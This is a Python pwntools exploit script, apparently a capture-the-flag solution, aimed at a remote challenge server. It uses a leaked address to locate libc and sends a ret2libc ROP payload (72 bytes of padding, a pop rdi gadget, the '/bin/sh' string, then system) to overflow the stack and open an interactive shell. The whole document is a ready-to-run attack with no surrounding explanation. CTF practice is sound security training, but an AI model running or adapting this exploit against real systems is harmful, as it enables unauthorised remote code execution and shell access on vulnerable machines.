#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./chall_patched',checksec=False)
libc = ELF("./libc6.so",checksec=False)
ld = ELF("./ld-2.39.so",checksec=False)
rop = ROP(elf)

#io = process()
io = remote("challenges2.perfectroot.wiki", 1235)

io.recvuntil(b'go: ')
leak = int(io.recvline().strip(),16)
print(hex(leak))
libc.address = leak - 0x60100
print(hex(libc.address))

pop_rdi = rop.find_gadget(["pop rdi","ret"])[0]
ret = rop.find_gadget(["ret"])[0]

payload = b'A'*72
payload += pack(pop_rdi)
payload += pack(next(libc.search(b'/bin/sh')))
payload += pack(ret)
payload += pack(libc.sym.system)

io.sendline(payload)
io.interactive()
